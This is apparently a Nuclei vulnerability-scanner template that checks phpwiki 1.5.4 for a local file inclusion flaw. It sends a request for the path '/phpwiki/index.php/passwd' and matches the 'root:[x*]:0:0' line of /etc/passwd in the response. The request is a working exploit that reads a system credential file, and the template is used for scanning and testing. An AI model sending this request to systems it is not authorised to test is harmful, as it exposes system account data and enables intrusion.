id: phpwiki-lfi

info:
  name: phpwiki 1.5.4 - XSS / Local File Inclusion
  author: 0x_Akoko
  severity: high
  reference: https://www.exploit-db.com/exploits/38027
  tags: phpwiki,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/phpwiki/index.php/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
